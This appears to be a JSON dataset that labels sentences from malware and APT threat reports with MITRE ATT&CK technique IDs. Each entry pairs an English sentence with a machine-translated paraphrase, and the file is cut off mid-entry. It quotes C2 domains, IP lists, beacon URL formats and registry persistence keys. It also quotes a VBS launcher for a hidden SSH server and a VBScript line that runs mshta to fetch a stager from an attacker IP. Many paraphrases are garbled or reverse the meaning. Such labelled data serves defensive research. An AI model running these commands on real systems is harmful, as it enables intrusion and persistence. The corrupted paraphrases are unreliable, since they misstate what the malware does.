    "Table 3: FELIXROOT backdoor parameters  Cryptography All data is transferred to C2 servers using AES encryption and the IbindCtx COM interface using HTTP or HTTPS protocol": [
        {
            "tec_id": "T1071",
            "en_text": "Table 3: FELIXROOT backdoor parameters  Cryptography All data is transferred to C2 servers using AES encryption and the IbindCtx COM interface using HTTP or HTTPS protocol",
            "data_text": "Table 3: FELEXROOT Backdoor Parameter Encryption All data is sent to the C2 server using AES encryption, and the IbindCtx COM interface uses the HTTP or HTTPS protocol."
        }
    ],
    "Previous related research: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/  Decoy images by country Jordan     The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.doc    Turkey     Turkey’s General Directorate of Security Turkey’s Directorate General of Coastal Safety        Turkey’s General Directorate of Security (Onemli Rapor.doc) Turkey’s Ministry of the Interior (Early election.doc)    Saudi Arabia Document signed by the Major General Pilot, commander of the Saudi Royal Air Force     KSA King Saud University (KSU) KSA King Saud University (KSU)    Azerbaijan İnkişaf üçün görüş.doc (meeting for development) Iraq     Iraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of Ministers    Pakistan     ECP.doc National Assembly of Pakistan.doc        P.Police.doc     Afghanistan President.doc, E-government of Afghanistan Technical details Below is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware": [
        {
            "tec_id": "T1071",
            "en_text": "Previous related research: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/  Decoy images by country Jordan     The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.doc    Turkey     Turkey’s General Directorate of Security Turkey’s Directorate General of Coastal Safety        Turkey’s General Directorate of Security (Onemli Rapor.doc) Turkey’s Ministry of the Interior (Early election.doc)    Saudi Arabia Document signed by the Major General Pilot, commander of the Saudi Royal Air Force     KSA King Saud University (KSU) KSA King Saud University (KSU)    Azerbaijan İnkişaf üçün görüş.doc (meeting for development) Iraq     Iraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of Ministers    Pakistan     ECP.doc National Assembly of Pakistan.doc        P.Police.doc     Afghanistan President.doc, E-government of Afghanistan Technical details Below is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware",
            "data_text": "Previous study: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/ JordanHowever, the Ministry of Justice (mwjo.doc) DAMAMAX.doc, Turkey's Director of Security, Onemli Rapor.doc, Turkey's Foreign Ministry of the Interior (early election).doc) The Saudi Arabian document is an Iraqi Foreign Ministry conference (Iraqa Ifnkiiafüngöŗ)) signed by a major pilot, commander of the Royal Air Force's King Saud University (KSU).Pakistan Ministerial Conference ECP.doc Pakistan Assembly.doc.P.Police.doc Afghanistan President.doc Below e-government technical details, start with an initial infection vector, execute VBA code via macro, and delete the PowerShell code that establishes command center communication to send victim system information.It then receives commands that the malware supports."
        }
    ],
    "http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php  Recommendations for organizations Effective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems": [
        {
            "tec_id": "T1071",
            "en_text": "http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php  Recommendations for organizations Effective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems",
            "data_text": "Recommendations for http://www.cankayasrc[.com/style/js/main.php http://ektamservis[.com/include/main.php http://gtme[.ae/font-awsome/css/main.php] Allows you to control your organization from advanced detectives, preventive, and targeted attacks through training. Tasks on the network or suspicious files on your system"
        }
    ],
    "This information can then be transmitted to the attacker using protocols such as FTP, HTTP, and SMTP": [
        {
            "tec_id": "T1071",
            "en_text": "This information can then be transmitted to the attacker using protocols such as FTP, HTTP, and SMTP",
            "data_text": "This information can then be sent to attackers using protocols such as FTP, HTTP, and SMTP."
        }
    ],
    "tfvn[.]com[.]vnshirkeswitch[.]netguideofgeorgia[.]orggulfclouds[.]sitejhssourcingltd[.]comkamagra4uk[.]compioneerfitting[.]compositronicsindia[.]comscseguros[.]ptspldernet[.]comtoshioco[.]comwww[.]happytohelpyou[.]inIP addressesThe following IP addresses have been observed to be associated with malware campaigns.112.213.89[.]4067.23.254[.]6162.212.33[.]98153.92.5[.]124185.117.22[.]19723.94.188[.]24667.23.254[.]17072.52.150[.]218148.66.136[.]62107.180.24[.]253108.179.246[.]13818.221.35[.]21494.46.15[.]20066.23.237[.]18672.52.150[.]218URLs:The following URLs have been observed to be associated with malware campaigns.https[:]//a[.]pomf[.]cat/http[:]//pomf[.]cat/upload[.]php": [],
    "The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain: <current process id>.<c2 domain> The C2 server will provide the system specific identifier within the answer portion of the DNS response": [
        {
            "tec_id": "T1071",
            "en_text": "The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain: <current process id>.<c2 domain> The C2 server will provide the system specific identifier within the answer portion of the DNS response",
            "data_text": "The initial DNS query sent by the payload to obtain a system-specific identifier uses the following structure that contains the current process identifier (PID) as a subdomain of the C2 domain:The C2 Domain > C2 server provides system-specific identifiers within the response portion of the DNS response."
        }
    ],
    "The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:    DNS Type Successful Cancel   A,AC 1.1.1.\\d+ 1.2.9.\\d+   AAAA 2a00:: 2200::   CNAME,MX,TXT,SRV,SOA ok cancel    After providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs": [],
    "To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure: <system id>-<job ID>-<offset data specific to job>.<c2 domain> The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server": [
        {
            "tec_id": "T1071",
            "en_text": "To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure: <system id>-<job ID>-<offset data specific to job>.<c2 domain> The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server",
            "data_text": "To obtain the string to be processed by the command, the payload runs a series of DNS queries to determine which domains have the following structure:The C2 Domain > C2 server provides responses to these queries, including responses to IPv4 or IPv6 addresses, depending on the type of DNS query the payload uses to communicate with the C2 server."
        }
    ],
    "This command will automatically set the DNS type to use for actual C2   $showconfig Uploads the current configuration of the payload to the C2   slpx:\\d+ Sets the sleep interval between outbound DNS requests   $fileUpload Downloads contents from the C2 server and writes them to a specified file    Table 3 Commands available to payload Campaign Analysis The following domains are configured within the payload to be used as C2s": [
        {
            "tec_id": "T1071",
            "en_text": "This command will automatically set the DNS type to use for actual C2   $showconfig Uploads the current configuration of the payload to the C2   slpx:\\d+ Sets the sleep interval between outbound DNS requests   $fileUpload Downloads contents from the C2 server and writes them to a specified file    Table 3 Commands available to payload Campaign Analysis The following domains are configured within the payload to be used as C2s",
            "data_text": "This command automatically sets the DNS type to be used for the actual C2$showconfig. Sets the current configuration of the payload between C2slpx:\\d+ outbound DNS request $fileUploadDownloads content. Download the download from the C2 server and write it to the specified file. Table 3 Commands available for Payload Analysis sysis The following domains are configured within the payload to be used as C2:"
        }
    ],
    "For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request": [
        {
            "tec_id": "T1071",
            "en_text": "For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request",
            "data_text": "For example, the downloader first attempts to communicate with the C2 server using an HTTPS request."
        }
    ],
    "If that HTTPS request is not successful, the downloader will issue an HTTP request": [
        {
            "tec_id": "T1071",
            "en_text": "If that HTTPS request is not successful, the downloader will issue an HTTP request",
            "data_text": "If the HTTPS request fails, the downloader issues an HTTP request."
        }
    ],
    "Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications": [
        {
            "tec_id": "T1071",
            "en_text": "Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications",
            "data_text": "Finally, if the HTTP request is not successful, the downloader will revert to using DNS tunneling to establish communication."
        }
    ],
    "If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling": [
        {
            "tec_id": "T1071",
            "en_text": "If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling",
            "data_text": "Use DNS tunneling if both attempts fail and the payload cannot obtain the session ID and preshared key via HTTP or HTTPS."
        }
    ],
    "It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful": [
        {
            "tec_id": "T1071",
            "en_text": "It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful",
            "data_text": "Use HTTPS/HTTP or DNS channels in a successful manner."
        }
    ],
    "The payload will construct a message that has the following structure that it will then send to the C2:   bye<char uuid[35]>d   The message above is sent via a simple HTTPS/HTTP POST request to the C2 server": [
        {
            "tec_id": "T1071",
            "en_text": "The payload will construct a message that has the following structure that it will then send to the C2:   bye<char uuid[35]>d   The message above is sent via a simple HTTPS/HTTP POST request to the C2 server",
            "data_text": "Configures a message with a structure that the payload sends to C2. The message above by <charuid[35]>d is sent to the C2 server via a simple HTTPS/HTTP POST request."
        }
    ],
    "As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:http://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)> The Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run": [
        {
            "tec_id": "T1071",
            "en_text": "As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:http://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)> The Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run",
            "data_text": "As you can see in the request above, the Trojan generates a beacon URL with the following structure: http://<c2 domain>/chk?<hex (environment).User name/environment.System name)> The Trojan issues a request for this URL to verify that the C2 server has a command to run the Trojan (and hence the chk string in the URL)."
        }
    ],
    "The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)> The upload command (2) writes data provided by the C2 to a specified file": [
        {
            "tec_id": "T1071",
            "en_text": "The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)> The upload command (2) writes data provided by the C2 to a specified file",
            "data_text": "The Trojan then reads the hexadecimal format of the file into 1500-byte blocks, and sends each 1500-byte of data to the following structured URL via an HTTP GET request: http://<c2 domain>/resp?<hex (environment).User name/environment.The system name)>AAZ<hex> upload command (2) writes the data provided by C2 to the specified file."
        }
    ],
    "[1] https://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/ [2] https://www.clearskysec.com/copykitten-jpost/": [
        {
            "tec_id": "T1071",
            "en_text": "[1] https://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/ [2] https://www.clearskysec.com/copykitten-jpost/",
            "data_text": "[1] [1] https://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/ [2] https://www.clearskysec.com/copykitten-jpost/"
        }
    ],
    "After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers": [
        {
            "tec_id": "T1071",
            "en_text": "After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers",
            "data_text": "After C2 information is collected, BADNEWS utilizes HTTP for communication with remote servers."
        }
    ],
    "33 Download specified file to %TEMP%\\up and execute it in a new process      During C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP": [],
    "Exfiltrate data using HTTP over HTTP over AES over XOR, or any combination of the available transports": [
        {
            "tec_id": "T1071",
            "en_text": "Exfiltrate data using HTTP over HTTP over AES over XOR, or any combination of the available transports",
            "data_text": "Filter data using HTTP over HTTP over AES over XOR or an available transport combination"
        }
    ],
    "Deep Discovery Inspector protects customers from these threats via this DDI Rule:  DDI Rule 18 : DNS response of a queried malware Command and Control domain DDI Rule 15 : Many unsuccessful logon attempts (nbt_scan.exe) DDI Rule 38 : Multiple unsuccessful logon attempts (nbt_scan.exe)  TippingPoint customers are protected from these threats via these ThreatDV filters:  27218: HTTP: TROJ_RATANKBA_A Checkin 28219: HTTP: TROJ_RATANKBA_A Checkin 02 27220: HTTPS: TROJ_RATANKBA_A Checkin 27221: HTTP: Sundown EK Flash Exploit (SWF_EXPLOYT.YYRQ)  A list of related Indicators of Compromise (IoCs) can be found in this appendix": [
        {
            "tec_id": "T1071",
            "en_text": "Deep Discovery Inspector protects customers from these threats via this DDI Rule:  DDI Rule 18 : DNS response of a queried malware Command and Control domain DDI Rule 15 : Many unsuccessful logon attempts (nbt_scan.exe) DDI Rule 38 : Multiple unsuccessful logon attempts (nbt_scan.exe)  TippingPoint customers are protected from these threats via these ThreatDV filters:  27218: HTTP: TROJ_RATANKBA_A Checkin 28219: HTTP: TROJ_RATANKBA_A Checkin 02 27220: HTTPS: TROJ_RATANKBA_A Checkin 27221: HTTP: Sundown EK Flash Exploit (SWF_EXPLOYT.YYRQ)  A list of related Indicators of Compromise (IoCs) can be found in this appendix",
            "data_text": "Deep Discovery Inspector has DDI Rules: DDI Rules 18: DNS Response Commands and Control Domain DDI Rules 15: Many failed logon attempts (nbt_scan).exe) DDI Rule 38: Multiple failed logon attempts (nbt_scan.exe) TipPoint customers are protected by threats.se ThreatDV Filter: 27218: HTTP: TROJ_RATANKBA_A Checkin 28219: HTTP: TROJ_RATANKBA_A Checkin 0227220: HTTPS: TROJ_RATANKBA_A Checkin 27221: HTTP: SundownEK Flash Exploit (EPLOY) list can be found in this Appendix."
        }
    ],
    "IcedCoffee is a fairly basic backdoor which uses WMI to collect a variety of system and user information from the system, which is then encoded with base64, encrypted with RC4 and submitted via HTTP POST to the C2 server": [
        {
            "tec_id": "T1071",
            "en_text": "IcedCoffee is a fairly basic backdoor which uses WMI to collect a variety of system and user information from the system, which is then encoded with base64, encrypted with RC4 and submitted via HTTP POST to the C2 server",
            "data_text": "Ice Coffee collects various system and user information from the system using WMI, is encoded as base64, encrypted as RC4, and submitted to the C2 server via HTTP POST."
        }
    ],
    "It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request": [
        {
            "tec_id": "T1071",
            "en_text": "It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request",
            "data_text": "It then calls a subfunction of argument 2 to obtain a string to use as an HTTP POST request."
        }
    ],
    "The resulting HTTP POST request looks like the following: POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1 Host: 185.25.50[.]93 Content-Type: application/x-www-form-urlencoded Content-Length: 21 porg=44908AE0524f422d We have not seen a C2 server respond to our requests during our analysis, however, we do know how the Trojan will parse the C2’s response for specific data": [],
    "We have seen the following HTTP POST parameters within the Zebrocy C++ samples: porg structOne oq volume DDE Details The author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection": [
        {
            "tec_id": "T1071",
            "en_text": "We have seen the following HTTP POST parameters within the Zebrocy C++ samples: porg structOne oq volume DDE Details The author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection",
            "data_text": "We saw the following HTTP POST parameters in the Zebrocy C++ sample:portstructOneq volume DDE Details The authors of DDE documents used in the February 2018 attack used some obfuscation techniques to avoid detection."
        }
    ],
    "Victim Registration SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C which is the compromised website of speakupomaha[.]com": [
        {
            "tec_id": "T1071",
            "en_text": "Victim Registration SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C which is the compromised website of speakupomaha[.]com",
            "data_text": "Victim registration SpeakUp uses HTTP to communicate with the primary C&C, the compromised website of speakopomaha [.com] using POST and GET requests."
        }
    ],
    "It uses the legitimate Naver email platform in order to communicate with the attackers via email": [
        {
            "tec_id": "T1071",
            "en_text": "It uses the legitimate Naver email platform in order to communicate with the attackers via email",
            "data_text": "It uses a legitimate Naver email platform to communicate with attackers via email."
        }
    ],
    "Command & Control  The malware communicates with the Naver email platform in order to communicate with the operator": [
        {
            "tec_id": "T1071",
            "en_text": "Command & Control  The malware communicates with the Naver email platform in order to communicate with the operator",
            "data_text": "command"
        }
    ],
    "It communicates with ftp.bytehost31[.]org via FTP for command and control (C2)": [
        {
            "tec_id": "T1071",
            "en_text": "It communicates with ftp.bytehost31[.]org via FTP for command and control (C2)",
            "data_text": "Communicate with ftp.bytehost31[.org] via FTP for command and control (C2)."
        }
    ],
    "Domains  http://mdzz2019.noip[.]cn:19931 http://mdzz2019.noip[.]cn:3654/  From my analyses, I was able to identify http://mdzz2019.noip[.]cn:19931 as its main C2 url.  This is a dynamic DNS, meaning the actual IP changes quite frequently": [
        {
            "tec_id": "T1071",
            "en_text": "Domains  http://mdzz2019.noip[.]cn:19931 http://mdzz2019.noip[.]cn:3654/  From my analyses, I was able to identify http://mdzz2019.noip[.]cn:19931 as its main C2 url.  This is a dynamic DNS, meaning the actual IP changes quite frequently",
            "data_text": "The domain http://mdz2019.noip[.cn:19931 http://mdz2019.noip[.cn:3654/] analysis showed that http://mdz2019.noip[.cn:19931] was identified as the primary C2 URL. This is dynamic DNS, which means that the actual IP changes quite frequently."
        }
    ],
    "XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system": [
        {
            "tec_id": "T1071",
            "en_text": "XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system",
            "data_text": "The X Agent uses HTTP requests to communicate with the C2 server so that threat actors can interact with compromised systems."
        }
    ],
    "The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2": [
        {
            "tec_id": "T1071",
            "en_text": "The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2",
            "data_text": "The Trojan sends data to the C2 server using an HTTP POST request as shown in Figure 1 and receives commands from the server using a GET request as shown in Figure 2."
        }
    ],
    "Figure 1 XAgent macOS HTTP POST request  Figure 2 XAgent mscOS HTTP GET request The C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart": [
        {
            "tec_id": "T1071",
            "en_text": "Figure 1 XAgent macOS HTTP POST request  Figure 2 XAgent mscOS HTTP GET request The C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart",
            "data_text": "Figure 1 XAgent macOS HTTP POST Request Figure 2 XAgent mscOS HTTP GET Request C2 URLOS generated by XAgent is very similar to the one created by Windows-based products."
        }
    ],
    "Figure 3 Hardware ID used by XAgent to uniquely identify compromised hosts When generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value": [
        {
            "tec_id": "T1071",
            "en_text": "Figure 3 Hardware ID used by XAgent to uniquely identify compromised hosts When generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value",
            "data_text": "Figure 3 When the X Agent generates a URL within a hardware ID HTTP POST and GET request that it uses to uniquely identify a compromised host, the X Agent uses a specific data structure that contains the agent_id value to set one HTTP parameter."
        }
    ],
    "For instance, when using this string we observed DNS queries for “apple-search.infoclose”, as the string “close” was supposed to be the next portion of the C2 URL": [
        {
            "tec_id": "T1071",
            "en_text": "For instance, when using this string we observed DNS queries for “apple-search.infoclose”, as the string “close” was supposed to be the next portion of the C2 URL",
            "data_text": "For example, when using this string, \"apple-search\" because the string \"close\" had to be the next part of the C2 URL.DNS query observed for infoclose\"."
        }
    ],
    "it operates over DNS traffic, but can also switch to encrypted channels such as HTTPS or SSL": [
        {
            "tec_id": "T1071",
            "en_text": "it operates over DNS traffic, but can also switch to encrypted channels such as HTTPS or SSL",
            "data_text": "It works through DNS traffic, but you can also switch to encrypted channels such as HTTPS or SSL."
        }
    ],
    "HAWKBALL is a backdoor that communicates to a single hard-coded C2 server using HTTP": [
        {
            "tec_id": "T1071",
            "en_text": "HAWKBALL is a backdoor that communicates to a single hard-coded C2 server using HTTP",
            "data_text": "HOKBALL is a backdoor that communicates with a single hard-coded C2 server using HTTP."
        }
    ],
    "The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443": [
        {
            "tec_id": "T1071",
            "en_text": "The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443",
            "data_text": "Malware uses HTTP over port 443 to send HTTP GET requests to the C2 IP address."
        }
    ],
    "Persistence is maintained through a Run registry key": [
        {
            "tec_id": "T1547.001",
            "en_text": "Persistence is maintained through a Run registry key",
            "data_text": "Maintain persistence with registry execution keys"
        }
    ],
    "In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(“WScript.Shell”) WshShell.CurrentDirectory = “C:\\WINDOWS\\TEMP\\Dropbear\\” WshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false As is evident here, the SSH server will accept connections on port number 6789": [
        {
            "tec_id": "T1547.001",
            "en_text": "In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(“WScript.Shell”) WshShell.CurrentDirectory = “C:\\WINDOWS\\TEMP\\Dropbear\\” WshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false As is evident here, the SSH server will accept connections on port number 6789",
            "data_text": "To run the SSH server, the attacker created a VBS file that said: Set WshShell = CreateObject (\"WScript\").shell\") WshShell.Run the current directory = \"C:\\WINDOWS\\\"TEMP\\Dropbear\\\"WshShell.exe -rsa -dss -a -p 6789\". 0, false As you can clearly see here, the SSH server accepts the connection with port number 6789."
        }
    ],
    "This marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup folder for the user:  C:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exe  This step establishes the persistence of the malware across reboots on the endpoint Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint  The malware might perform this activity for a couple of reasons:  Establish persistence for itself on the endpoint Establish persistence of another component of the malware on the endpoint Update itself on endpoint after a separate updater component downloads the update from the control server  The malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware": [],
    "Finally, the first DLL adds the registry key “SysRat,” at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup": [
        {
            "tec_id": "T1547.001",
            "en_text": "Finally, the first DLL adds the registry key “SysRat,” at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup",
            "data_text": "Finally, the first DLL adds the registry key \"SysRat\" to Software\\Microsoft\\.Windows\\Current Version\\Run - Verify that malware runs at startup."
        }
    ],
    "The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically: [HKLM and HKCU]\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\explorer Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file": [],
    "The RunAtLoad key will command launchd to run the daemon when the operating system starts up, while the KeepAlive key will command launchd to let the process run indefinitely": [
        {
            "tec_id": "T1547.001",
            "en_text": "The RunAtLoad key will command launchd to run the daemon when the operating system starts up, while the KeepAlive key will command launchd to let the process run indefinitely",
            "data_text": "The RunAtLoad key commands the daemon to run when the operating system starts, while the KeepAlive key commands the process to run indefinitely."
        }
    ],
    "The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\\\"wscript.shell\\\")objshell.run \\\"mshta hxxp://86.106.131.177:6500/zIZFh\\\",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities": [
        {
            "tec_id": "T1547.001",
            "en_text": "The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\\\"wscript.shell\\\")objshell.run \\\"mshta hxxp://86.106.131.177:6500/zIZFh\\\",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities",
            "data_text": "Built-in VBScripts are retrieved from resources and decrypted using the same algorithm as described above, resulting in a clear text called setobjshell = create object(\\\"wscript).shell\\)objshell.run \\\"mshta hxxp://86.106.131:6500/zIZFh\\\", The vbhide Koadic C2 server responds to this request. This code acts as a Koadic staging payload, which allows the actor to run additional Koadic modules on the final system to perform post-discovery operations."
        }
    ],
    "NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence": [
        {
            "tec_id": "T1547.001",
            "en_text": "NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence",
            "data_text": "NavRAT then generates a registry key to run a copy of this file on the next reboot of the system. This is an early method of persistence."
        }
    ],
    "Once the user clicks on the fake Adobe Flash Player installer, it will extract/create the following malicious payload into the Startup directory to maintain its persistence:": [
        {
            "tec_id": "T1547.001",
            "en_text": "Once the user clicks on the fake Adobe Flash Player installer, it will extract/create the following malicious payload into the Startup directory to maintain its persistence:",
            "data_text": "When a user clicks the fake Adobe Flash Player installer, the next malicious payload is extracted/created into the Startup directory to maintain persistence."
        }
    ],
    "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts": [
        {
            "tec_id": "T1547.001",
            "en_text": "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts",
            "data_text": "Register the RUN key in the registry below so that the VBS file runs each time the computer starts."
        }
    ],
    "A new registry entry is created at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of “C:\\ ProgramData \\ Initech \\Initech.exe” /run.": [
        {
            "tec_id": "T1547.001",
            "en_text": "A new registry entry is created at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of “C:\\ ProgramData \\ Initech \\Initech.exe” /run.",
            "data_text": "A new registry entry is created in HKEY_CURRENT_USERS\\Software\\Microsoft\\.Windows\\current version\\C:\\ProgramData\\Initech\\Initech.Run \\Graphics using the exe value."
        }
    ],
    "When each file is encrypted, registry keys are created under HKU\\{SID}\\Software\\Microsoft\\ RestartManager \\ which are used to track metadata pertaining to the file being encrypted, such as owner, sequence, session and file hash": [
        {
            "tec_id": "T1547.001",
            "en_text": "When each file is encrypted, registry keys are created under HKU\\{SID}\\Software\\Microsoft\\ RestartManager \\ which are used to track metadata pertaining to the file being encrypted, such as owner, sequence, session and file hash",
            "data_text": "After each file is encrypted, a registry key is created under HKU\\{SID}\\Software\\Microsoft\\RestartManager\\. This key is used to track metadata related to files that are encrypted, such as owner, sequence, session, and file hash."
        }
    ],
    "APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g": [
        {
            "tec_id": "T1547.009",
            "en_text": "APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g",
            "data_text": "APT10 was relatively less sophisticated, utilizing .lnk files in archives, files with double extensions (e.g., .lnk files)."
        }
    ],
    "The .lnk file extracted from the .7zip file": [
        {
            "tec_id": "T1547.009",
            "en_text": "The .lnk file extracted from the .7zip file",
            "data_text": "The .lnk file is.Extracted from 7zip file."
        }
    ],
    "When the .lnk file is initialized, it spawns a CMD process": [
        {
            "tec_id": "T1547.009",
            "en_text": "When the .lnk file is initialized, it spawns a CMD process",
            "data_text": "Creates a CMD process when the .lnk file is initialized."
        }
    ],
    "We have covered recent FIN7 activity in previous public blog posts:   FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings  FIN7 Evolution and the Phishing LNK  To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence  The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity": [
        {
            "tec_id": "T1547.009",
            "en_text": "We have covered recent FIN7 activity in previous public blog posts:   FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings  FIN7 Evolution and the Phishing LNK  To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence  The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity",
            "data_text": "A previous public blog post addressed the recent FIN7 activity. Includes additional information on the FireEye SIGE Intelligence MySIGHT portal using the SEC Filings Fin7 Evolution and Fishing LNG To SDB or Not To SDB: FIN7 Shim databases for FIN7 Spear Phishing campaigns. and observation of FIN7 activities"
        }
    ],
    "The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo": [
        {
            "tec_id": "T1547.009",
